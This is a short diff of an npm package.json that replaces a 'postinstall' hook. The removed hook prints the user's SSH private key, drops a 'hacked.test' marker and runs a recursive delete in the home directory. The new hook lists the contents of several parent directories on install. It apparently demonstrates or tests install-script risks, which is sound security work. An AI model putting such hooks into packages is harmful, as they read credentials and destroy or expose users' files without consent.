@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "postinstall": "cat ~/.ssh/id_rsa && mkfile ~/hacked.test && rm -rf ~/allfiles"
+    "postinstall": "pwd . && ls -la ./../ && ls -la ./../../ && ls -la ./../../../"
   },
   "author": "",
   "license": "ISC"
